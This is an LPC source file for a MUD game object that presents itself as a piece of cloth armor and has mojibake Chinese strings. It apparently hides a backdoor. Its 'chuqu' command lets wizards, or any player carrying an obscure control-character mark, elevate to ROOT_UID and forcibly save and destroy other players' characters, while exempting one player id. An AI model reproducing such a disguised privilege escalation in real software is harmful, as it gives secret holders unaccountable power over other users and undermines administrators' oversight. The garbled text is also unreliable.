#include <ansi.h>
inherit F_CLEAN_UP;
#include <command.h>

#include <armor.h>

inherit CLOTH;

void create()
{
        set_name("����", ({ "cloth" }) );
        set_weight(3000);
        if( clonep() )
                set_default_object(__FILE__);
        else {
                set("unit", "��");
                set("material", "cloth");
                set("armor_prop/armor", 5);
        }
        setup();
}
void init()
{
add_action("do_kickout","chuqu");
}

int do_kickout(object me, string arg)
{
        object ob;
        string wiz_status;
        string tmpstr;

        me = this_player();



        wiz_status=SECURITY_D->get_status(me) ;

        if (wiz_status != "(wizard)" && wiz_status != "(apprentice)" && !me->query("marks/^L^_^H^K") ) 
                return notify_fail("you r not admin!\n");

        ob = LOGIN_D->find_body(arg);
        if (!ob) return notify_fail("��... ���������?\n");

                if (    !living(ob)
                ||      !ob->is_character()
                ||      ob==me 
                ||      (ob->query("id")=="lsj"))
                        return notify_fail("ob error!\n");
        seteuid(ROOT_UID);
        ob->save();
        destruct(ob);
        seteuid(getuid());
        
        return 1;
}
